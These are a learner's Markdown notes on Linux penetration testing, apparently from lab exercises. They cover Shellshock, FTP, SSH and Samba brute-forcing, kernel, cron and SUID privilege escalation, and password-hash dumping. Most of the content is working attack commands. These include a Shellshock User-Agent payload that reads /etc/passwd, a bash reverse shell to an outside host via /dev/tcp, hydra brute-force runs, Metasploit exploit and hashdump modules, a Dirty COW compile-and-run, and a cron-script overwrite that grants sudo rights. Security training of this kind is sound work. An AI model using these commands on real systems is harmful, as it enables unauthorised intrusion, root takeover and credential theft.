#linuxPT
## Tools

- FoxyProxy
- BurpSuite
- nmap #nmap 
- searchsploit #searchsploit
- smbmap #smbmap
- smbclient #smbclient
- enum4linux #enum4linux
- Linux-Exploit-Suggester
	- Github : http://github.com/mzet-/linux-exploit-suggester
- exploit.db : dirtycow - create user account with admin priv (initially the flaws is about : race condition on copy on write (COW) breaking private RO memory mapping. Allow modify on disk bin, bypass permission etc...)

## Linux vulnerabilities

### CVE Shellshock

- Stephane chazelas / 2014
- Vuln in bash shell, after a serie of char, can execute command
- for RCE, apache web server conf for running .cgi/.sh are vuln
- .cgi scripts are used by apache to execute commands on linux to display a result in web

Attacks scenario :
- Find input vector = path of cgi script to then communicate with bash
- can be exploit manually or msf module



demo
```bash

#Context : website and the cgi script path is : http://192.24.241.3/gettime.cgi

#reco to scan if it's vuln
nmap -sV 192.24.241.3 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
#It is vuln

#the lab have in firefox, foxy proxy tool
#this enable to route the traffic to a proxy, in our case BurpSuite

#activate foxy proxy on firefox, select burp
#launch Burp
guidelines :
- Intercept the page when go in /gettime.cgi
- send it to the repeater
- change the user-agent content : () {:;} ; echo; echo; /bin/bash -c 'cat /etc/passwd'
#In the result we get the file content 

#For rce
#in out terminal
nc -lvnp 1234
#in burp
User-Agent content : () {:;} ; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.24.241.2/1234 0>&1'
#send
#in nc bash apear
```

Demo metasploit
```bash

msfconsole
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.24.241.3
set TARGETURI /gettime.cgi
run
#meterpreter session

```
### FTP

- to facilitate file sharing / port 21
- auth require username/password
- In some case anonymous access can be configured -> no need for creds

attack scenario :
- bruteforce

Demo #nmap #searchsploit 
```bash

nmap -sV 192.93.66.3
#ftp port 21 open - ProFTPD

#to search for nmap scripts
ls -al /usr/share/nmap/scripts | grep ftp-*

#bruteforce with hidra
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/meteasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 ftp

#when creds found
ftp 192.93.66.3
sysadmin
password
get secrets.txt
exit

#nmap show that the ftp service is ProFTPd
#another way to search exploit 
seachsploit ProFTPD

```

### SSH

- Telnet successor's
- port 22
- auth :
	- login/password
	- key

attack scenario :
- bruteforce

Demo
```bash

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.156.221.3 -t 4 ssh

ssh sysadmin@192.156.221.3
yes
password
groups sysadmin
cat /etc/*issue
uname -r

```

### Samba

- SMB 445 or 139 on NetBios
- Linux implementation of SMB, allows windows clients to access linux shares
- auth : username/password

attack scenario :
- bruteforce
- Use smbmap to enumerate shares, list shares' content, download file, execute commands on target
- or smbclient, a ftp like tool to interact with shares

Demo
```bash

hydra -l admin -P /usr/share/metesploit-framework/data/wordlists/unix_passwords.txt 192.56.47.3 smb

#tool 1
smbmap -H 192.56.47.3 -u admin -p password1

#tool 2
#to list all shares
smbclient -L 192.56.47.3 -U admin
password1
?
dir
get flag

#To interact witj shares
smbclient //192.56.47.3/admin -U admin
password1
?
dir
get flag

#tool 3
enum4linux -a 192.56.47.3
enum4linux -a -u admin -p password1 192.56.47.3

```


## Linux Privesc

### Kernel exploit

- Linux exploit suggester, tool to detect security flaws
- give every publicly known kernel exploit

Attack scenario :
- Use Linux exploite suggester (LES)
	- download LES.sh on the github
- transfer it to the victim
- execute

Demo
```bash

#context : LES.sh already download + meterpreter session
#on the meterpreter session
upload ~/Downloads/les.sh
shell
/bin/bash -i
chmod +x les.py
./les.sh
#enumarate list of vuln with exploit
#top 1 is dirtycow
#les provide with the exploit url : https://www.exploit-db.com/download/49839

#2 solutions :
# compile in attack and upload the bin
# upload the source code C and compile in victim
#here only the 2nd works

#on atttacker machine download the exploit
mv 49839.c dirty.c
#go back on meterpreter and upload
upload dirty.c
/bin/bash -i
# compile
gcc -pthread dirty.c -o dirty -lcrypt
chmod +x dirty
./dirty mypassword
#create a firefart user

su firefart
mypassword
#or
ssh firefart@10.10.10.50
mypassword

#root priv
```

### Cron Jobs

- cron = task scheduling, time-based service - run app, scripts and commands repeatedly on specified schedule
- the conf file is the crontab file
- can be run as any user, interesting if the user is root -  to elevate our priv, need to identify cron scheduled by root or file process by the cron job

Demo
```bash

#context : only linux terminal, simple user : student
whoami
groups student
cat /etc/passwd

#show cron create by user
crontab -l
#no result, and we want cron created by root

ls -al
#show a file "message" own by root, suspicious

#strat : search if a app/script interact with this "message" file
# we just currently have the file name : message and it's location : /home/student
grep -rnw /usr -e "/home/student/messsage"

#grep show this path is call in a script "/usr/local/share/copy.sh"
#gonna try to change the script to elevate our priv, everyone can edit this script
#no vim in the machine
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
sudo -l
#we have now all right (the cron job run every minute)
sudo su
whoami
#root

```

### SUID Binaries

![[Pasted image 20250422222342.png]]

- with this permission, user can execute script we the same right of the owner
- used to provide unprivileged users with ability to run specific scripts/bin
- only limited for the scripts/bin - it's not a privesc
- if not properly conf, can be exploited

attack scenario
- search for bin with the SUID bit set to root or priv users
- need access perm to execute the SUID bin

Demo
```bash

#context : only linux terminal, simple user : student
whoami
groups student

ls -al
#show a bin owned by root with the SUID bit set
#show another bin : /greetings

./greetings
#can t execute it
./welcome
#we can execute it but nothing interesting for now
file welcome
strings welcome
#we see in strings the word "greetings", we can suppose it call this bin
#now we know we have a script we can execute as root and it call a bon "greetings", we dont have right on the greeting script but we can usurpate it by deleting it and creating another one

rm greetings
#copy the bash bin as greetings
cp /bin/bash greetings
./welcome
#we are now in a session as root

```
![[Pasted image 20250422223032.png]]The SUID bit, can be execute as root

## Linux Creds Dumping

Linux hashes

- all accounts info stored in passwd file
- now in passwd, no more password as this file is accessible to all users
- all encrypted passwords are in /etc/shadow
- this file can only be accessed/read by root

- The passwd file give the hashing algorithm used to hash the password 
	- $1 = MD5
	- $2 = blowfish
	- $5 = SHA-256
	- $6 = SHA-512

Demo dumping
```bash

nmap -sV 192.44.146.3

#proFTPd service running
searchsploit proFTPd
#msf module exist
msfconsole
search proftpd
use exploit/linux/misc/proftpd_113c_backdoor
set payload payload/cmd/unix/reverse
setg RHOSTS 192.44.146.3
run
#session
/bin/bash -i
whoami
root

#to upgrade the session to meterpreter session
ctrl+Z
sessions -u 1
#meterpreter session
sessions 2
sysinfo
getuid
#root user

cat /etc/shadow
#password hash

#other technique
background
search hashdump
use post/linux/gather/hashdump
set SESSION 2
run

#crack
use auxiliary/analyze/crack_linux
set SHA512 true
run

#extract all hash

```